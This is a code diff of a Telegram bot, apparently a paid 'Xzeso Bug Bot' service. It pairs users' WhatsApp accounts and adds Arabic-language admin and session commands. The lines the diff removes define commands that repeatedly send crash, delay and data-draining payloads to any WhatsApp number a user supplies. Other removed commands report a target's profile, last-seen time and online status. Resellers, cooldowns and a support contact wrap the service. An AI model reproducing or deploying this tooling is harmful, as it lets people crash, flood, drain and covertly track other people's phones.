+🔑 الاشتراكات الفعالة: ${activeSubs}
+🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}
+🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}`, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// COMMAND: /checkbio
+// COMMAND: /ping
 // =====================================================================
 
-bot.command("checkbio", async (ctx) => {
+bot.command("ping", async (ctx) => {
+  const start = Date.now();
+  const msg = await ctx.reply("🏓 جاري الاختبار...");
+  const latency = Date.now() - start;
+  await ctx.api.editMessageText(msg.chat.id, msg.message_id,
+    `🏓 <b>Pong!</b>\n📊 الكسل: ${latency}ms\n⏱️ التشغيل: ${formatUptime(process.uptime())}`, { parse_mode: "HTML" });
+});
+
+// =====================================================================
+// COMMAND: /adminpanel (Admin Panel)
+// =====================================================================
+
+bot.command("adminpanel", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
+    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
 
+    const stats = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
+    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;
+
+    await ctx.reply(`👑 <b>لوحة تحكم الأدمن</b>
+
+━━━━━━━━━━━━━━━━━━━━━━━
+👥 المستخدمين: ${usersDb.length}
+🎫 الرموز: ${stats.codes.length}
+🔑 الاشتراكات: ${activeSubs}
+🆓 الوضع المجاني: ${isFreeMode() ? "✅" : "❌"}
+🛠️ الصيانة: ${isMaintenance() ? "✅" : "❌"}
+🖼️ صورة البوت: ${settingsDb.botImage ? "✅" : "❌"}
+━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 اختر من القائمة:</blockquote>`, { parse_mode: "HTML", reply_markup: getAdminKeyboard() });
+  } catch (e) { ctx.reply("❌ خطأ"); }
+});
+
+// =====================================================================
+// COMMAND: /reqpair (WhatsApp Pairing)
+// =====================================================================
+
+bot.command("reqpair", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(" ");
-    const input = args[1];
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /checkbio 628xxx", { parse_mode: "Markdown" });
-    }
+    const phone = args[1]?.replace(/[^0-9]/g, "");
+    if (!phone || phone.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/reqpair 628xxxxxxxx</code>\n📱 أدخل رقم واتساب للربط");
 
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
+    const waitMsg = await ctx.reply("⏳ جاري إنشاء كود الربط...");
+    const code = await requestPairingCode(userId, phone);
 
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    const contact = await client.contactQuery(X);
-    
-    let info = `📱 *Profile Info*\n═══════════════════════════════\n`;
-    info += `📌 *Number:* ${cleanTarget}\n`;
-    info += `📛 *Name:* ${contact?.name || 'Tidak tersedia'}\n`;
-    info += `🖼️ *Status:* ${contact?.status || 'Tidak tersedia'}\n`;
-    info += `🕐 *Last Seen:* ${contact?.lastSeen || 'Tidak tersedia'}\n\n`;
-    info += `📅 *Time:* ${new Date().toLocaleString()}`;
-
-    await ctx.reply(info, { parse_mode: "Markdown" });
-    
+    await ctx.api.deleteMessage(userId, waitMsg.message_id).catch(() => {});
+    await ctx.reply(`✅ <b>كود الربط جاهز!</b>\n📱 الرقم: <code>${phone}</code>\n🔐 الكود: <code>${code}</code>\n\nأدخل الكود في تطبيق واتساب`, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`CHECKBIO ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan info profil.");
+    log.error(`REQPAIR ERROR: ${e.message}`);
+    ctx.reply("❌ فشل الربط");
   }
 });
 
 // =====================================================================
-// COMMAND: /checklast
+// COMMAND: /clearsesi (Clear Session)
 // =====================================================================
 
-bot.command("checklast", async (ctx) => {
+bot.command("clearsesi", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const input = args[1];
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /checklast 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    const presence = await client.presenceSubscribe(X);
-    
-    const lastSeen = presence?.lastSeen ? new Date(presence.lastSeen).toLocaleString() : 'Tidak tersedia';
-    
-    await ctx.reply(`🕐 *Last Seen*\n═══════════════════════════════\n📌 ${cleanTarget}\n🕐 ${lastSeen}`);
-    
-  } catch (e) {
-    log.error(`CHECKLAST ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengecek last seen.");
-  }
+    const result = await deleteSessionForUser(userId);
+    ctx.reply(result ? "✅ تم حذف الجلسة بنجاح!" : "❌ لم يتم العثور على جلسة");
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// COMMAND: /checkonline
+// COMMAND: /listpair (List Sessions)
 // =====================================================================
 
-bot.command("checkonline", async (ctx) => {
+bot.command("listpair", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const input = args[1];
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /checkonline 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    const presence = await client.presenceSubscribe(X);
-    
-    if (presence) {
-      await ctx.reply(`✅ ${cleanTarget} sedang online!`);
-    } else {
-      await ctx.reply(`❌ ${cleanTarget} offline.`);
-    }
-    
-  } catch (e) {
-    log.error(`CHECKONLINE ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengecek status online.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /getgroups
-// =====================================================================
-
-bot.command("getgroups", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    
-    const groups = await client.groupFetchAllParticipating();
-    const groupList = Object.keys(groups);
-    
-    let text = `📌 *Groups (${groupList.length})*\n═══════════════════════════════\n`;
-    
-    for (const gid of groupList.slice(0, 20)) {
-      const group = groups[gid];
-      text += `📎 ${group.subject}\n`;
-      text += `   🆔 ${gid}\n`;
-      text += `   👥 ${group.participants?.length || 0} members\n\n`;
-    }
-    
-    if (groupList.length > 20) {
-      text += `... dan ${groupList.length - 20} grup lainnya`;
-    }
-
-    await ctx.reply(text, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`GETGROUPS ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan daftar grup.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /killall
-// =====================================================================
-
-bot.command("killall", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    let count = 0;
-    for (const uid in waClients) {
-      try {
-        if (waClients[uid]?.sock) {
-          await waClients[uid].sock.end();
-        }
-        delete waClients[uid];
-        count++;
-      } catch (e) {}
-    }
-
-    await ctx.reply(`✅ Semua session (${count}) telah dihentikan.`);
-    
-  } catch (e) {
-    log.error(`KILLALL ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal menghentikan session.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /killuser
-// =====================================================================
-
-bot.command("killuser", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    
-    if (!target) {
-      return ctx.reply("⚠️ Format: /killuser <user_id>", { parse_mode: "Markdown" });
-    }
-
-    if (waClients[target]) {
-      try {
-        if (waClients[target]?.sock) {
-          await waClients[target].sock.end();
-        }
-        delete waClients[target];
-        await deleteSessionForUser(target);
-        await ctx.reply(`✅ Session user ${target} telah dihentikan.`);
-      } catch (e) {
-        await ctx.reply(`❌ Gagal menghentikan session ${target}.`);
-      }
-    } else {
-      await ctx.reply(`⚠️ Tidak ada session aktif untuk user ${target}.`);
-    }
-    
-  } catch (e) {
-    log.error(`KILLUSER ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal menghentikan session user.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /sessioninfo
-// =====================================================================
-
-bot.command("sessioninfo", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const user = client.user;
-    const authState = client.authState;
-    const creds = authState?.creds || {};
-    const me = creds?.me || {};
-
-    let info = `📱 *Session Info*\n═══════════════════════════════\n`;
-    info += `🆔 *JID:* ${user?.id || 'Unknown'}\n`;
-    info += `📛 *Name:* ${me?.name || 'Unknown'}\n`;
-    info += `📟 *Device:* ${me?.device || 'Unknown'}\n`;
-    info += `💻 *Platform:* ${creds?.platform || 'Unknown'}\n`;
-    info += `📦 *WA Version:* ${creds?.waVersion || 'Unknown'}\n`;
-    info += `🔗 *Status:* ${clientEntry.status || 'Unknown'}\n`;
-    info += `📅 *Last Activity:* ${clientEntry.lastActivity ? new Date(clientEntry.lastActivity).toLocaleString() : 'Unknown'}\n`;
-    info += `📊 *Message Count:* ${clientEntry.messageCount || 0}`;
-
-    await ctx.reply(info, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`SESSIONINFO ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan info session.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /block
-// =====================================================================
-
-bot.command("block", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    
-    if (!target) {
-      return ctx.reply("⚠️ Format: /block 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = target.replace(/[^0-9]/g, "");
-    if (!blacklist.includes(cleanTarget)) {
-      blacklist.push(cleanTarget);
-      saveBlacklist();
-    }
-
-    await ctx.reply(`✅ ${cleanTarget} telah diblokir.`);
-    
-  } catch (e) {
-    log.error(`BLOCK ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal memblokir nomor.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /unblock
-// =====================================================================
-
-bot.command("unblock", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    
-    if (!target) {
-      return ctx.reply("⚠️ Format: /unblock 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = target.replace(/[^0-9]/g, "");
-    blacklist = blacklist.filter(num => num !== cleanTarget);
-    saveBlacklist();
-
-    await ctx.reply(`✅ ${cleanTarget} telah diunblock.`);
-    
-  } catch (e) {
-    log.error(`UNBLOCK ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal unblock nomor.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /blacklist
-// =====================================================================
-
-bot.command("blacklist", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
-
-    if (blacklist.length === 0) {
-      return ctx.reply("📭 Blacklist kosong.");
-    }
-
-    let text = `🚫 *Blacklist (${blacklist.length})*\n═══════════════════════════════\n`;
-    blacklist.forEach((num, i) => {
-      text += `${i+1}. ${num}\n`;
+    const sessions = Object.entries(waClients).filter(([, v]) => v.status === "open");
+    let text = "📱 <b>الجلسات النشطة:</b>\n\n";
+    sessions.forEach(([id, v]) => {
+      text += `• User: ${id}\n  Status: ✅ Open\n  Last Activity: ${new Date(v.lastActivity).toLocaleString()}\n\n`;
     });
-
-    await ctx.reply(text, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`BLACKLIST ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan blacklist.");
-  }
+    if (sessions.length === 0) text += "📭 لا توجد جلسات نشطة";
+    await ctx.reply(text, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// COMMAND: /whitelist
+// COMMAND: /sessions (Session Stats)
 // =====================================================================
 
-bot.command("whitelist", async (ctx) => {
+bot.command("sessions", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
+    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ مخصص للملك والموزعين!");
 
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    
-    if (!target) {
-      return ctx.reply("⚠️ Format: /whitelist 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = target.replace(/[^0-9]/g, "");
-    if (!whitelist.includes(cleanTarget)) {
-      whitelist.push(cleanTarget);
-      saveWhitelist();
-    }
-
-    await ctx.reply(`✅ ${cleanTarget} telah ditambahkan ke whitelist.`);
-    
-  } catch (e) {
-    log.error(`WHITELIST ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal menambahkan ke whitelist.");
-  }
+    const total = Object.keys(waClients).length;
+    const active = Object.entries(waClients).filter(([, v]) => v.status === "open").length;
+    await ctx.reply(`📊 <b>إحصائيات الجلسات</b>\n\n📱 الإجمالي: ${total}\n✅ النشطة: ${active}\n❌ غير النشطة: ${total - active}`, { parse_mode: "HTML" });
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// COMMAND: /alert
+// COMMAND: /addadmin (Add Admin)
 // =====================================================================
 
-bot.command("alert", async (ctx) => {
+bot.command("addadmin", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
+    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
 
-    const args = ctx.message.text.split(" ");
-    const msg = args.slice(1).join(" ");
-    
-    if (!msg) {
-      return ctx.reply("⚠️ Format: /alert <pesan>", { parse_mode: "Markdown" });
-    }
+    const target = ctx.message.text.split(" ")[1];
+    if (!target) return ctx.reply("⚠️ الاستخدام: <code>/addadmin 123456789</code>\n👥 إضافة مسؤول");
 
-    const users = safeReadJSON("database/users.json", []);
-    let ok = 0, fail = 0;
-
-    for (const id of users) {
-      try {
-        await ctx.api.sendMessage(id, `🔔 *Alert*\n\n${msg}`, { parse_mode: "Markdown" });
-        ok++;
-      } catch {
-        fail++;
-      }
-    }
-
-    await ctx.reply(`✅ Alert selesai!\n📤 Terkirim: ${ok}\n❌ Gagal: ${fail}`);
-    
-  } catch (e) {
-    log.error(`ALERT ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengirim alert.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /broadcastall
-// =====================================================================
-
-bot.command("broadcastall", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const args = ctx.message.text.split(" ");
-    const msg = args.slice(1).join(" ");
-    
-    if (!msg) {
-      return ctx.reply("⚠️ Format: /broadcastall <pesan>", { parse_mode: "Markdown" });
-    }
-
-    const users = safeReadJSON("database/users.json", []);
-    let ok = 0, fail = 0;
-
-    for (const id of users) {
-      try {
-        await ctx.api.sendMessage(id, `📢 *Broadcast*\n\n${msg}`, { parse_mode: "Markdown" });
-        ok++;
-      } catch {
-        fail++;
-      }
-    }
-
-    await ctx.reply(`✅ Broadcast selesai!\n📤 Terkirim: ${ok}\n❌ Gagal: ${fail}`);
-    
-  } catch (e) {
-    log.error(`BROADCASTALL ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengirim broadcast.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /dm
-// =====================================================================
-
-bot.command("dm", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
-
-    const args = ctx.message.text.split(" ");
-    const target = args[1];
-    const msg = args.slice(2).join(" ");
-    
-    if (!target || !msg) {
-      return ctx.reply("⚠️ Format: /dm <user_id> <pesan>", { parse_mode: "Markdown" });
-    }
-
-    await ctx.api.sendMessage(target, `📩 *Pesan dari Admin*\n\n${msg}`, { parse_mode: "Markdown" });
-    await ctx.reply(`✅ Pesan terkirim ke ${target}`);
-    
-  } catch (e) {
-    log.error(`DM ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengirim DM.");
-  }
-});
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 5/7: Lines 2601-3250
-// Total: ~4550 Lines
-// =====================================================================
-
-// =====================================================================
-// COMMAND: /gettoken
-// =====================================================================
-
-bot.command("gettoken", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const token = config.telegramBotToken || "Not set";
-    await ctx.reply(`🔑 *Bot Token*\n\`${token}\``, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`GETTOKEN ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan token.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /settoken
-// =====================================================================
-
-bot.command("settoken", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const args = ctx.message.text.split(" ");
-    const newToken = args[1];
-    
-    if (!newToken) {
-      return ctx.reply("⚠️ Format: /settoken <new_token>", { parse_mode: "Markdown" });
-    }
-
-    const configPath = path.join(__dirname, "config.js");
-    let configContent = fs.readFileSync(configPath, "utf8");
-    configContent = configContent.replace(
-      /telegramBotToken: "[^"]*"/,
-      `telegramBotToken: "${newToken}"`
-    );
-    fs.writeFileSync(configPath, configContent);
-
-    await ctx.reply(`✅ Token telah diperbarui. Restart bot untuk menerapkan perubahan.`);
-    
-  } catch (e) {
-    log.error(`SETTOKEN ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengubah token.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /getconfig
-// =====================================================================
-
-bot.command("getconfig", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const configData = {
-      ownerId: config.ownerId,
-      channelId: CHANNEL_ID,
-      groupId: GROUP_ID,
-      sessionName: config.sessionName || "session",
-      freeMode: isFreeMode(),
-      blacklistCount: blacklist.length,
-      whitelistCount: whitelist.length,
-      sessionCount: Object.keys(waClients).length,
-      usersCount: safeReadJSON("database/users.json", []).length,
-    };
-
-    await ctx.reply(`📋 *Bot Configuration*\n\`\`\`json\n${JSON.stringify(configData, null, 2)}\n\`\`\``, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`GETCONFIG ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan konfigurasi.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /setconfig
-// =====================================================================
-
-bot.command("setconfig", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    const args = ctx.message.text.split(" ");
-    const key = args[1];
-    const value = args.slice(2).join(" ");
-    
-    if (!key || !value) {
-      return ctx.reply("⚠️ Format: /setconfig <key> <value>", { parse_mode: "Markdown" });
-    }
-
-    const configPath = path.join(__dirname, "config.js");
-    let configContent = fs.readFileSync(configPath, "utf8");
-    
-    if (key === "ownerId") {
-      configContent = configContent.replace(
-        /ownerId: \d+/,
-        `ownerId: ${parseInt(value)}`
-      );
-    } else if (key === "chanelid") {
-      configContent = configContent.replace(
-        /chanelid: "[^"]*"/,
-        `chanelid: "${value}"`
-      );
-    } else if (key === "chatgrupid") {
-      configContent = configContent.replace(
-        /chatgrupid: "[^"]*"/,
-        `chatgrupid: "${value}"`
-      );
-    } else if (key === "thumburl") {
-      configContent = configContent.replace(
-        /thumburl: "[^"]*"/,
-        `thumburl: "${value}"`
-      );
+    if (!settingsDb.admins.includes(target)) {
+      settingsDb.admins.push(target);
+      settingsDb.permissions[target] = { addedAt: Date.now(), canManageUsers: true, canManageCodes: true };
+      safeWriteJSON("./database/settings.json", settingsDb);
+      ctx.reply(`✅ تمت إضافة المسؤول: ${target}`, { parse_mode: "HTML" });
     } else {
-      return ctx.reply(`❌ Key "${key}" tidak dikenal.`);
+      ctx.reply(`⚠️ ${target} مسؤول بالفعل`);
     }
-
-    fs.writeFileSync(configPath, configContent);
-
-    await ctx.reply(`✅ Config "${key}" telah diperbarui. Restart bot untuk menerapkan perubahan.`);
-    
-  } catch (e) {
-    log.error(`SETCONFIG ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mengubah konfigurasi.");
-  }
+  } catch (e) { ctx.reply("❌ خطأ"); }
 });
 
 // =====================================================================
-// Original Bug Commands (All 9 commands)
+// COMMAND: /deladmin (Remove Admin)
 // =====================================================================
 
-const BUG_COMMANDS = [
-  { name: "Xzesoandro", bugFunc: async (client, X) => {
-    for (let z = 0; z < 100; z++) {
-      await autosync(client, X);
-      await audiocall(client, X);
-      await sleep(50);
-    }
-  }, type: "crash andro" },
-  { name: "Droidx", bugFunc: async (client, X) => {
-    for (let z = 0; z < 30; z++) {
-      await crashSendPaymentNPE(client, X);
-      await audiocall(client, X);
-      await sleep(50);
-    }
-  }, type: "crash andro" },
-  { name: "Betaxzeso", bugFunc: async (client, X) => {
-    for (let z = 0; z < 2; z++) {
-      await fungadjigelo(client, X);
-      await crashSendPaymentNPE(client, X);
-      await sleep(50);
-    }
-  }, type: "crash andro beta" },
-  { name: "Uixzeso", bugFunc: async (client, X) => {
-    for (let z = 0; z < 50; z++) {
-      await crashandro(client, X);
-      await sleep(100);
-      await crashandro(client, X);
-      await sleep(100);
-    }
-  }, type: "crash andro" },
-  { name: "Delayxzeso", bugFunc: async (client, X) => {
-    for (let z = 0; z < 80; z++) {
-      await hardfix1(client, X);
-      await hardfix2(client, X);
-      await hardfix3(client, X);
-      await delayhigh(client, X);
-      await sleep(100);
-    }
-  }, type: "delay andro" },
-  { name: "Betaxzosex", bugFunc: async (client, X) => {
-    for (let z = 0; z < 100; z++) {
-      await delaybeta(client, X);
-      await delayhigh(client, X);
-      await hardfix1(client, X);
-      await sleep(100);
-    }
-  }, type: "delay andro" },
-  { name: "Xzesoiosx", bugFunc: async (client, X) => {
-    for (let z = 0; z < 200; z++) {
-      await XoipCrash(client, X);
-      await XoipFc(client, X, true);
-      await sleep(100);
-    }
-  }, type: "crash iphone" },
-  { name: "invisisendx", bugFunc: async (client, X) => {
-    for (let z = 0; z < 100; z++) {
-      await Occolot(client, X);
-      await hardfix3(client, X);
-      await sleep(100);
-    }
-  }, type: "delay andro" },
-  { name: "Xzesox", bugFunc: async (client, X) => {
-    for (let z = 0; z < 120; z++) {
-      await BuldozerCombine(client, X, true);
-      await ZenoDrainKuota(client, X, true);
-      await delayhigh(client, X);
-      await sleep(100);
-    }
-  }, type: "sedot kuota andro" },
-];
-
-BUG_COMMANDS.forEach(({ name, bugFunc, type }) => {
-  bot.command(name.toLowerCase(), async (ctx) => {
-    try {
-      const userId = ctx.from.id.toString();
-      
-      const cooldownCheck = cooldownModule.checkCooldown(userId, name);
-      if (cooldownCheck.onCooldown) {
-        return ctx.reply(
-          `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /${name} lagi.`,
-          { parse_mode: "Markdown" }
-        );
-      }
-      cooldownModule.updateCooldown(userId, name);
-
-      if (!hasAccess(userId)) {
-        return ctx.reply(getNoAccessMessage(userId));
-      }
-
-      const args = ctx.message.text.split(" ");
-      const input = args[1];
-      if (!input) {
-        return ctx.reply(
-          `<b>⚠️ Format Yang Benar</b>\n` +
-          `Gunakan format:\n` +
-          `<code>/${name} 628xxxxxxx</code>\n\n` +
-          `<i>Contoh:</i> <code>/${name} 628123456789</code>`,
-          { parse_mode: "HTML" }
-        );
-      }
-
-      const cleanTarget = input.replace(/[^0-9]/g, "");
-      if (!cleanTarget || cleanTarget.length < 10) {
-        return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
-      }
-
-      const X = `${cleanTarget}@s.whatsapp.net`;
-      const clientEntry = waClients[userId];
-
-      if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-        return ctx.reply(
-          "<b>📵 WhatsApp belum terhubung.</b>\n" +
-          "Silakan pairing dengan:\n" +
-          "<code>/reqpair 628xxxx</code>",
-          { parse_mode: "HTML" }
-        );
-      }
-
-      const client = clientEntry.sock;
-      const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-      await ctx.replyWithPhoto(imageMenu, {
-        caption:
-          `<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n` +
-          `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
-          `🎭 <b>type bug:</b> <code>${type}</code>\n` +
-          `📊 <b>status:</b> <code>🦠 executing...</code>\n\n` +
-          `<b>📞 Support</b>\nContact @I8_ZU for assistance`,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "👀 channel", url: "https://t.me/I8_ZU" }],
-            [{ text: "👤 owner", url: "https://t.me/I8_ZU" }],
-          ],
-        },
-      });
-
-      await bugFunc(client, X);
-
-      await ctx.reply(
-        `✅ <b>Bug execution completed!</b>\n` +
-        `📌 Target: <code>${cleanTarget}</code>\n` +
-        `🦠 Type: <code>${type}</code>\n\n` +
-        `📞 Support: @I8_ZU`,
-        { parse_mode: "HTML" }
-      );
-
-    } catch (e) {
-      log.error(`BUG ${name.toUpperCase()} ERROR: ${e.message}`);
-      await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
-    }
-  });
-});
-
-// =====================================================================
-// Cooldown Commands
-// =====================================================================
-
-bot.command("cdon", async (ctx) => {
+bot.command("deladmin", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
+    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
 
-    cooldownModule.enableCooldown();
+    const target = ctx.message.text.split(" ")[1];
+    if (!target) return ctx.reply("⚠️ الاستخدام: <code>/deladmin 123456789</code>");
 
-    await ctx.reply(
-      "✅ *Cooldown System Diaktifkan*\n\n" +
-      "🔒 Commands yang di-cooldown (20 menit per penggunaan):\n" +
-      "• /Xzesoandro\n" +
-      "• /Delayxzeso\n" +
-      "• /Xzesoiosx\n" +
-      "• /Uixzeso\n" +
-      "• /Droidx\n" +
-      "• /Betaxzeso\n" +
-      "• /Betaxzosex\n" +
-      "• /invisisendx\n" +
-      "• /Xzesox\n" +
-      "• /masscrash\n" +
-      "• /spamcall\n" +
-      "• /floodmsg\n" +
-      "• /crashgroup\n" +
-      "• /crashstatus\n" +
-      "• /crashchannel\n\n" +
-      "⏰ Setiap user yang menggunakan command ini akan mendapat cooldown 20 menit.",
-      { parse_mode: "Markdown" }
-    );
-  } catch (e) {
-    log.error(`CDON ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan cooldown.");
-  }
-});
-
-bot.command("cdoff", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    cooldownModule.disableCooldown();
-
-    await ctx.reply(
-      "✅ *Cooldown System Dimatikan*\n\n" +
-      "🔓 User bisa menggunakan semua command tanpa cooldown.",
-      { parse_mode: "Markdown" }
-    );
-  } catch (e) {
-    log.error(`CDOFF ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat menonaktifkan cooldown.");
-  }
-});
-
